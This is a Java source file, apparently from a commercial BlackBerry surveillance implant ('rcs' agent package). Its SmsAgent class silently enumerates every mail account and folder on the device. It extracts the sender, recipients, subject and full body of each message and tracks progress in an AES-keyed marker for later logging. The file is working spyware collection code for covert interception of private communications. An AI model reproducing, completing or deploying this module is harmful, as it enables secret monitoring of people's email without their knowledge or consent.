package com.ht.rcs.blackberry.agent;

import java.io.IOException;
import java.util.Date;
import java.util.Vector;

import net.rim.blackberry.api.mail.Address;
import net.rim.blackberry.api.mail.BodyPart;
import net.rim.blackberry.api.mail.Folder;
import net.rim.blackberry.api.mail.Message;
import net.rim.blackberry.api.mail.MessagingException;
import net.rim.blackberry.api.mail.MimeBodyPart;
import net.rim.blackberry.api.mail.Multipart;
import net.rim.blackberry.api.mail.ServiceConfiguration;
import net.rim.blackberry.api.mail.Session;
import net.rim.blackberry.api.mail.Store;
import net.rim.blackberry.api.mail.TextBodyPart;
import net.rim.blackberry.api.mail.Transport;
import net.rim.device.api.io.http.HttpDateParser;
import net.rim.device.api.servicebook.ServiceBook;
import net.rim.device.api.servicebook.ServiceRecord;
import net.rim.device.api.util.IntHashtable;

import com.ht.rcs.blackberry.config.Keys;
import com.ht.rcs.blackberry.log.Markup;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.Utils;

/*
 * http://rcs-dev/trac/browser/RCSASP/deps/Common/ASP_Common.h
 * 
 * 118  #define LOGTYPE_MAIL_RAW                        0x1001
119 #define LOGTYPE_MAIL                            0x0210


 * 198  typedef struct _MailAdditionalData {
199         UINT uVersion;
200                 #define LOG_MAIL_VERSION 2009070301
201         UINT uFlags;
202         UINT uSize;
203         FILETIME ftTime;
204 } MailAdditionalData, *pMailAdditionalData;

http://rcs-dev/trac/browser/RCSASP/deps/XML-RPC/XMLInserting.cpp

uFlags = 1 : body retrieved
 0: non ha superato i controlli di size, il body viene tagliato


 */

public class SmsAgent extends Agent {
    //#debug
    static Debug debug = new Debug("SmsAgent", DebugLevel.VERBOSE);

    protected static final int BODY = 1;
    protected static final int SLEEPTIME = 5000;
    protected static final boolean FILTERFROM = false;
    protected static final boolean FILTERTO = false;
    protected static final String DATEFROM = "Tue, Mar 23 2010 06:31:27 GMT";
    protected static final String DATETO = "Tue, Apr 01 2010 22:31:27 GMT";
    protected static final boolean FILTERDIM = false;
    protected static final int BODYDIM = 0;
    protected static final boolean DEBUG = false;
    protected static IntHashtable _fieldTable;
    private static boolean _editable;
    protected static Store _store;
    private static ServiceRecord[] _mailServiceRecords;
    protected static long lastcheck;

    Markup markup_date;

    protected static final int[] HEADER_KEYS = { Message.RecipientType.TO,
            Message.RecipientType.CC, Message.RecipientType.BCC };

    public SmsAgent(boolean agentStatus) {
        super(AGENT_SMS, agentStatus, true, "SmsAgent");
    }

    protected SmsAgent(boolean agentStatus, byte[] confParams) {
        this(agentStatus);
        parse(confParams);

        // mantiene la data prima di controllare tutte le email
        markup_date = new Markup(agentId, Keys.getInstance().getAesKey());

        setDelay(SLEEPTIME);
        setPeriod(SLEEPTIME);

    }

    long timestamp;
    long firsttimestamp = 0;

    public void actualStart() {

    }

    public void actualStop() {

    }

    public void actualRun() {
        // #debug
        debug.trace("run");

        if (markup_date.isMarkup() == false) {
            debug.info("Il Markup non esiste, timestamp = 0 ");
            timestamp = 0;
            Date date = new Date();
            firsttimestamp = date.getTime();

        } else {
            // serializzi la data date
            debug
                    .info("::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::");
            Date date = new Date();
            timestamp = date.getTime();

            byte[] deserialized;
            debug.trace("Sto leggendo dal markup");
            try {
                deserialized = markup_date.readMarkup();
                lastcheck = Utils.byteArrayToLong(deserialized, 0);

            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            debug.trace("Cominciamo a spulciare gli account di posta...");
        }

        ServiceBook serviceBook = ServiceBook.getSB();
        _mailServiceRecords = serviceBook.findRecordsByCid("CMIME");
        String[] names = new String[_mailServiceRecords.length];

        debug.trace("Ci sono: " + _mailServiceRecords.length
                + " account di posta!");

        // Controllo tutti gli account di posta
        for (int count = _mailServiceRecords.length - 1; count >= 0; --count) {
            names[count] = _mailServiceRecords[count].getName();
            debug.trace("Nome dell'account di posta: " + names[count]);

            names[count] = _mailServiceRecords[0].getName();
            ServiceConfiguration sc = new ServiceConfiguration(
                    _mailServiceRecords[count]);
            _store = Session.getInstance(sc).getStore();

            Folder[] folders = _store.list();
            // Scandisco ogni Folder dell'account di posta
            scanFolder(folders);
        }
        debug.trace("Fine ricerca!!");

        // Crea markup_finished per tenere traccia del controllo
        // concluso
        // correttamente
        if (timestamp == 0) {
            timestamp = firsttimestamp;
        }

        debug.trace("Sto scrivendo nel markup");
        byte[] serialize = Utils.longToByteArray(timestamp);
        markup_date.writeMarkup(serialize);

        // return true;
    }

    protected boolean parse(byte[] confParameters) {

        return false;
    }

    /**
     * scansione ricorsiva della directories
     * 
     * @param subfolders
     */
    public static void scanFolder(Folder[] subfolders) {
        Folder[] dirs;
        long dataArrivo, filterDate;
        // Date emailDate;
        boolean printEmail;

        // Date receivedDate;
        if (subfolders.length <= 0) {
            return;
        }
        for (int count = 0; count < subfolders.length; count++) {
            debug.trace("Nome della cartella: "
                    + subfolders[count].getFullName());
            dirs = subfolders[count].list();
            scanFolder(dirs);
            try {
                Message[] messages = subfolders[count].getMessages();
                // Scandisco ogni e-mail dell'account di posta
                for (int j = 0; j < messages.length; j++) {
                    Message message = messages[j];

                    printEmail = false;

                    debug.trace("Data di invio dell'email "
                            + message.getSentDate() + " long: "
                            + message.getSentDate().getTime());
                    debug.trace("Data di arrivo dell'email "
                            + message.getReceivedDate() + " long: "
                            + message.getReceivedDate().getTime());
                    debug.trace("Data del filtro FROM " + DATEFROM + " long: "
                            + HttpDateParser.parse(DATEFROM));
                    debug.trace("Data del filtro TO " + DATETO + " long: "
                            + HttpDateParser.parse(DATETO));

                    // Se c'e' un filtro sulla data
                    // entro
                    if (FILTERFROM == true) {
                        dataArrivo = message.getReceivedDate().getTime();
                        filterDate = HttpDateParser.parse(DATEFROM);
                        // Se la data e' successiva a quella dell'ultima
                        // lettura e la data dell'email e' successiva a
                        // quella del filtro
                        if (dataArrivo >= lastcheck && dataArrivo >= filterDate) {
                            // Se c'e' anche il filtro della data di fine
                            if (FILTERTO == true) {
                                filterDate = HttpDateParser.parse(DATETO);
                                // Se la data dell'email e' tra data di
                                // inizio e data di fine => OK
                                if (dataArrivo <= filterDate) {
                                    debug
                                            .trace("Sono attivi i 2 filtri e l'email rispetta i 2 criteri FROM e TO");
                                    printEmail = true;
                                }
                            } else {
                                debug
                                        .trace("E' attivo solo il filtro FROM e l'email rispetta questo criterio");
                                // Se la data dell'email e' corretta, e c'e'
                                // solo il primo filtro ma non il secondo =>
                                // OK
                                printEmail = true;
                            }
                        }

                    } else {
                        debug
                                .trace("Non sono attivi criteri quindi l'email viene acquisita");
                        // Se non ci sono filtri
                        dataArrivo = message.getReceivedDate().getTime();
                        debug.trace("dataArrivo = " + dataArrivo
                                + "lastcheck = " + lastcheck);
                        if (dataArrivo >= lastcheck) {
                            printEmail = true;
                        }
                    }

                    if (printEmail == true) {
                        
                        debug
                                .trace("-------------------------------- e-mail numero "
                                        + j
                                        + " ---------------------------------");
                        debug
                                .trace("Mittente dell'email: "
                                        + message.getFrom());
                        // debug.trace("Destinatario dell'email: " +
                        // message.getReplyTo());
                        Address[] addresses = message
                                .getRecipients(HEADER_KEYS[0]);
                        String name = addresses[0].getAddr();
                        debug.trace("Destinatario dell'email: " + name);

                        debug.trace("Dimensione dell'email: "
                                + message.getSize() + "bytes");
                        debug.trace("Data invio dell'email: "
                                + message.getSentDate());
                        debug.trace("Oggetto dell'email: "
                                + message.getSubject());
                        // Date dataArrivo = message.getReceivedDate();
                        // Date dataArrivo = message.getSentDate();
                        // Date expirationDate = new
                        // Date(HttpDateParser.parse(dataArrivo.toString()));
                        // System.out.println("Data di arrivo dell'email long: "
                        // + expirationDate.getTime());
                        debug.trace("Data di invio dell'email long: "
                                + message.getSentDate().getTime());
                        debug.trace("Data di arrivo dell'email long: "
                                + message.getReceivedDate().getTime());
                        // Date data = new Date();
                        // long timeArrived;
                        // timeArrived = data.getTime();

                        Object obj = message.getContent();

                        Multipart parent = null;
                        if (obj instanceof MimeBodyPart
                                || obj instanceof TextBodyPart) {
                            BodyPart bp = (BodyPart) obj;
                            parent = bp.getParent();
                        } else {
                            parent = (Multipart) obj;
                        }

                        // Display the message body
                        String mpType = parent.getContentType();
                        if (mpType
                                .equals(BodyPart.ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)
                                || mpType
                                        .equals(BodyPart.ContentType.TYPE_MULTIPART_MIXED_STRING)) {
                            displayMultipart(parent);
                        }
                        System.out
                                .println("-------------------------------------------------------------------------------------");
                    }
                }
            } catch (MessagingException e) {
                debug.trace("Folder#getMessages() threw " + e.toString());

            }
        }
    }

    /**
     * controlla se il messaggio e' mime e ne stampa il contenuto
     * 
     * @param multipart
     */
    protected static void displayMultipart(Multipart multipart) {
        // This vector stores fields which are to be displayed only after all
        // of the body fields are displayed. (Attachments and Contacts).
        Vector delayedFields = new Vector();

        // Process each part of the multi-part, taking the appropriate action
        // depending on the part's type. This loop should: display text and
        // html body parts, recursively display multi-parts and store
        // attachments and contacts to display later.
        for (int index = 0; index < multipart.getCount(); index++) {
            BodyPart bodyPart = multipart.getBodyPart(index);

            // If this body part is text then display all of it
            if (bodyPart instanceof TextBodyPart) {
                TextBodyPart textBodyPart = (TextBodyPart) bodyPart;

                // If there are missing parts of the text, try to retrieve the
                // rest of it.
                if (textBodyPart.hasMore()) {
                    try {
                        Transport.more(textBodyPart, true);
                    } catch (Exception e) {
                        debug.trace("Transport.more(BodyPart, boolean) threw "
                                + e.toString());
                    }
                }
                String plainText = (String) textBodyPart.getContent();

                // Display the plain text, using an EditField if the message is
                // editable or a RichTextField if it is not editable. Note: this
                // does not add any empty fields.
                if (plainText.length() != 0) {
                    if (FILTERDIM == true && plainText.length() > BODYDIM) {
                        // se e' attivo il filtro sulla dimensione dell'email, sovrascrive al body dell'email la stringa troncata
                        plainText = plainText.substring(0, (BODYDIM )); // l'unita' di misura e' il kbyte
                    }
                    debug.trace("Testo dell'email :" + plainText);
                }
            } else if (bodyPart instanceof MimeBodyPart) {
                MimeBodyPart mimeBodyPart = (MimeBodyPart) bodyPart;

                // If the content is text then display it
                String contentType = mimeBodyPart.getContentType();
                if (contentType
                        .startsWith(BodyPart.ContentType.TYPE_TEXT_HTML_STRING)) {
                    Object obj = mimeBodyPart.getContent();
                    if (obj != null) {
                        String htmlText = new String((byte[]) obj);
                        // se e' attivo il filtro sulla dimensione dell'email, sovrascrive al body dell'email la stringa troncata
                        if (FILTERDIM == true && htmlText.length() > BODYDIM) {
                            htmlText = htmlText.substring(0, (BODYDIM )); // l'unita' di misura e' il kbyte
                        }
                        debug.trace("Testo dell'email MIME: " + htmlText);
                    }
                } else if (contentType
                        .equals(BodyPart.ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)) {
                    // If the body part is a multi-part and it has the the
                    // content type of TYPE_MULTIPART_ALTERNATIVE_STRING, then
                    // recursively display the multi-part.
                    Object obj = mimeBodyPart.getContent();
                    if (obj instanceof Multipart) {
                        Multipart childMultipart = (Multipart) obj;
                        String childMultipartType = childMultipart
                                .getContentType();
                        if (childMultipartType
                                .equals(BodyPart.ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)) {
                            displayMultipart(childMultipart);
                        }
                    }
                }
            }

        }

        // Now that the body parts have been displayed, display the queued
        // fields while separating them by inserting a separator field.
        for (int index = 0; index < delayedFields.size(); index++) {
            // System.out.println(delayedFields.elementAt(index));
            debug.trace(delayedFields.elementAt(index).toString());
        }
    }

}
